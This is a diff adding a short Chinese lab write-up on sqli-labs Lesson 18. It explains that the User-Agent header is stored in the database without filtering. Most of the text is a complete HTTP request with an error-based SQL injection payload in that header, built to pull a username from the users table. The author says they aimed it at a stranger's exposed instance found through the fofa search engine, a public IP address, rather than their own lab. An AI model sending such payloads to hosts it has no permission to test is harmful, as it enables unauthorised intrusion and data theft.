@@ -1,0 +1,21 @@
+第十八，审计了代码后发现，对username，passwd进行了严格的过滤。但是将访问页面的user-agent和IP插入数据库中
+user-agent没有做过滤，发现user-agent头部注入,z直接在对应的头部插入注入语句
+
+这里由于我在windows搭建的sqli-labs实验不成功，上fofa找了一个
+
+http://118.24.125.87:8000
+
+
+POST /Less-18/ HTTP/1.1
+Host: 118.24.125.87:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) and '1'='1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://118.24.125.87:8000/Less-18/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+uname=admin&passwd=admin&submit=Submit
